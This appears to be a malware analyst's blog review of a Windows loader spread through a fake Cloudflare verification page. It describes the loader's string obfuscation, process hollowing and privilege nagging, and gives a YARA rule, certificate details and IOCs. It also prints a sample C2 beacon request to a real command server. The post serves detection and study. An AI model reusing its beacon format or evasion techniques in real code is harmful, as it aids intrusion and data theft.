---
title: "[Malware Review]: Mofongo Loader"
date: 2024-04-29
toc: true
tags: ["loader", "process hollowing", "windows", "obfuscation", "malware review"]
---

Rather than doing vanilla malware write ups, I'd like to introduce a different
format - malware review. I'm going to rate the malware based around loose
categories with an emphasis on how fun it was to reverse. The scoring will be
biased, arbitrary, and unfair. Let's go!

## Discovery
{{< box info >}}
If you wish to follow along, the sample hash is
`e9007c7bd6be14d6364b91e1fd7b03043dffe8a405eca5cc6dc809762bd31ba2`.
{{< /box >}}

I ran into this sample completely by chance. As I was submitting logs for a
recent amateur radio contest (not kidding) my browser was redirected to what
appeared to be an knockoff Cloudflare verification page. The page encouraged
me to run an executable program in order to "verify" myself before proceeding
to my original destination. It even downloaded the sample for me - how could I
say no! The program name was `VERIFICATION.exe`. In its eariler versions it
even came with a Cloudflare icon, but more recent samples sport a generic green
checkmark icon. As far as delivery methods are concerned it's pretty lame, but
the fact that I found it in the wild is definitely worth some points. `6/10`

## Obfuscation
The loader uses a number of classic obfuscation and evasion techniques,
however they are not consistently applied and mostly fall flat. For instance,
most WinAPI functions in this loader are called indirectly, but calls to
`LoadLibrary` and `GetProcAddress` are direct (for example @ `0x140013c68`).
The author does use PEB walking to find `kernell.dll` in memory and resolve
`QueryFullProcessImageNameW` (`0x140013bd4`). Unfortunately both `kernell.dll`
and `QueryFullProcessImageNameW` strings are decrypted and passed as arguments
to the PEB walking and DLL parsing procedures respectively, telegraphing what's
going on.

Speaking of encryption, strings in this loader are encrypted. There are three (!)
decryption routines, all using XOR. Two of the routines are fixed-length key XOR:
one for ASCII strings - another for wide char strings.

![img](/xor_decryption_0.png)

These two functions are wrapped in a multitude of routines with hardcoded
global addresses for the plaintext and hardcoded plaintext lengths. This means
that buffers store the decrypted strings not based on their content, but rather
their length. So if two different strings of the same length need to be decrypted,
the latest plaintext will clobber the previous. This actually happens several
times. It's *weird* and mildly annoying, but ultimately not effective. A little
binja scripting goas a long way here.

{{< box important>}}
Thank God DLL and function name lengths are rarely the same!
{{< /box >}}

The third encryption method (for example @ `0x14001b710`) is used only in one
function (`0x140012b20`), but unlike the aforementioned encryption routines, the
plaintext is local to the function. The key is derived from the string index by
summing and mod'ing it with fixed byte-size values. Again though, it looks like
each decryption function is generated per string length. Considering the author
is operating on encrypted `NUL` terminated strings that they control, knowing
the length of the string is not necessary - just stop when you hit a `NUL`
byte. The many decryption functions aren't really providing significant
obfuscation value. On a positive note, this decryption routine proved to be a
pretty effective signature for this loader and not too difficult to script.
`2/10`

## C2 Communication
C2 communication is done through HTTPS. The C2 domains sit behind Cloudflare.
The loader builds the following object to identify the compromised host:
```json
{"appid":"<hardcoded_uuid>","deviceid":"<long_decimal_number"}
```

The `appid` is a UUID, hardcoded into the sample; `deviceid` is a string,
representing a concatenation of the current user's `SID_IDENTIFIER_AUTHORITY`,
and all of the user's sub authority values in decimal. The loader sends the
identification object as `POST` data to the C2, using a custom user agent `UA/1`.

Full request to the C2 might look something like this:
```
POST /windows/verify HTTP/1.1
Host: cloudnetworkverify.com
User-Agent: UA/1
Content-Length: 101
Content-Type: application/json

{"appid": "cf5e1917-02e8-4eaf-849d-bd53c72e36e3", "deviceid": "..."}
```

In return, the loader expects a response with a header `securedata:` and
base64-encoded data that is longer than 200 bytes. If the response is too
short, the program cleans up and exits. Using HTTPS for C2 comms makes sense,
sitting behind Cloudflare also makes sense, but it's not very exciting. `5/10`

## Payload
If present, contents of `securedata:` header are set as a value to an environment
variable `msedge`. It is not used anywhere else in the loader, perhaps it's used
in the payload to encrypt the exfil? The base64 encoded payload is decoded in
`0x140012260` and the binary blob is then passed through another goofy decryption
routine (`0x140012570`). The resulting bytes are then mapped into a suspended
`msedge` process via classic process hollowing in `0x140012b20`. When setting
up the `msedge` process, the loader also creates a one-way pipe and attempts to
receive data from the payload. Judging by the fact that the code handling
this data relies on a terminating `NUL` to compute its length, the routine
likely expects an ASCII string. It doesn't appear to be used anywhere else in
the loader, so it's unclear whether this is an unfinished feature or simply a
way to track payload's progress.

So what's the payload? Well, unfortunately it looks like the most recent domain
is no longer serving the second stage, at least in response to any of my attempts.
Perhaps I'm too late and it's already shot down, or perhaps the ironic "SUCCESS"
reply is a troll. I hope the latter, because that's way funnier. Some claim
that the second stage steals Chrome-related data, but so far I was not able to
verify that. If anyone has the dump of the second stage - I'd love to take a
look! It's hard to rate something I've never seen, but as far as the delivery
is concerned I'll give it a `6/10`. Hey, at least they used a real malware
technique!

## Wildcard Round: Being annoying - best LPE?
A funny feature of this loader is that it will spawn itself in an infinite loop
until admin privileges are granted to it.
![img](/annoying_lpe.png)
Is it absurd? Yes. Will it absolutely work on way too many people? I'm willing
to bet. `8/10` for audacity.

## Code Signing
{{< box info >}}
I decided to call it "mofongo" because the code is signed by Xuaony Plantain
E-Commerce Trading. Sounds official!
{{< /box >}}
So far, I've found samples with certificates issued by GlobalSign GCC and
Sectigo. The most recent and common subject is under the name of
`Xuaony Plantain E-Commerce Trading Co., Ltd.`:
```
Subject: /businessCategory=Private Organization/serialNumber=91420600MACLU7R889/jurisdictionC=CN/jurisdictionST=Hubei/jurisdictionL=Xiangyang/C=CN/ST=Hubei/L=Xiangyang/O=Xuaony Plantain E-Commerce Trading Co., Ltd./CN=Xuaony Plantain E-Commerce Trading Co., Ltd.
Issuer : /C=BE/O=GlobalSign nv-sa/CN=GlobalSign GCC R45 EV CodeSigning CA 2020
Serial : 5867CAD98B5C8552F60A7BD8
Certificate expiration date:
    notBefore : Mar 30 11:20:38 2024 GMT
    notAfter : Mar 30 05:26:45 2025 GMT
```
It appears that GlobalSign has already revoked this certificate.

Another subject appears in earlier samples:
```
Subject: /C=EE/ST=Harjumaa/O=GreenEngine OU/CN=GreenEngine OU
Issuer : /C=GB/O=Sectigo Limited/CN=Sectigo Public Code Signing CA R36
Serial : 6AB35C5785260695E9C012514DB0C299
Certificate expiration date:
    notBefore : May 15 00:00:00 2023 GMT
    notAfter : May 14 23:59:59 2024 GMT
```

## A note on the Rich header
A few early samples had an unstripped Rich header:
```
user@linux $ richie_rich -i ac4d0d31c8355f9ea6f59580d107ec9ae88da58179c8fa8606a4937ff87da5dc.exe
------------------------------------------------------
Count   Minor Version   ProdID
------------------------------------------------------
6       29395           Masm1400 (0x0103)
174     29395           Utc1900_CPP (0x0105)
16      29395           Utc1900_C (0x0104)
1       0               Unknown (0x0000)
16      33030           Utc1900_C (0x0104)
18      33030           Masm1400 (0x0103)
82      33030           Utc1900_CPP (0x0105)
7       29395           Implib1400 (0x0101)
105     0               Import0 (0x0001)
4       33135           Utc1900_CPP (0x0105)
1       33135           Masm1400 (0x0103)
1       33135           Linker1400 (0x0102)
```
Although the Rich header is easily spoofed, the fact that the values are
consistent and the author chose to strip it in later versions suggests it may
be the original header.

## YARA Rule
```yara
rule mofongo_loader
{
    meta:
        malware = "Mofongo Loader"
        description = "This loader maps and executes a payload in a hollowed msedge process"
        author = "vrzh"

    strings:
        // A peculiar string decryption routine; serves as a good signature.
        $string_decryption_0 = {
            b9 ?? 00 00 00 f7 f9 8b c2 83 c0 ?? 8b 4c 24 ?? 33 c8 8b c1 48 63
            0c 24 48 8b 54 24 ?? 88 04 0a
        }
    condition:
        uint16(0) == 0x5A4D and $string_decryption_0
}
```

## IOC
C2 Domains & URL:
```
https://cloudnetworkverify[.]com/windows/verify
https://checkcloudnet[.]com/check/connection
https://verifstep[.]com/VERIFICATION.exe
https://chikabonitaez[.]site/11/VERIFICATION.exe
```

Files:
```
VERIFICATION.exe
```

Hashes:
```
2fdb228dbd1da27d70cf99b399d8ea419bd914c9f9594ad017bfdf005a2aef1e
3e6ba2c93db0c9b97330098914e14ee3718a8e5fa7f8bc15eb511d219d050871
8f957a03b1c92a5dc7d396ddb8724abdf450e6b8c98e68460fcee1037835e800
ac4d0d31c8355f9ea6f59580d107ec9ae88da58179c8fa8606a4937ff87da5dc
ae8d3b5728ec39a84a515d8240c4fc958e94cf1fd552fcfc9dad0cf6ba379421
b68adceb4eea31a7f1ad264b3fbff20526bb96049ceb41f43310c46bc543d4a5
e9007c7bd6be14d6364b91e1fd7b03043dffe8a405eca5cc6dc809762bd31ba2
```

## Final Score

The wildcard round pulled the score up to `5.4/10` - not bad! Definitely fun, not
too difficult, great for intermediate level practice.
